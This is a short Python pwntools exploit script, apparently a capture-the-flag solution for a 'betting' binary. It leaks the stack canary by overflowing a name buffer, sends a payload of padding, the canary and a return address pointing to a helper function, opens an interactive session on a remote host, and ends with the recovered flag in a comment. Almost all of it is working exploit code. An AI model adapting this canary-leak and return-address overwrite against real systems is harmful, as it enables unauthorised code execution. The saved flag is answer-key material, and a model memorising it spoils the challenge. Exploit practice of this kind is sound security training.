from pwn import *

s = remote('110.10.147.29', 8282)
#s = process('./betting')
e = ELF('./betting')

helper = 0x4008f6

s.sendlineafter('name? ', 'A'*24)
s.sendlineafter('with? ', '100')

s.recvuntil('Hi, '+'A'*24+'\x0a')
canary = u64('\x00'+s.recv(7))
log.info("canary : " + hex(canary))

payload = "A"*40 + p64(canary) + "A"*8 + p64(helper)
s.sendline('100\x0a'+payload)

s.interactive()

#flag{L1fe consists n0t 1n h0lding good cards but in playing those you h0ld well:)}
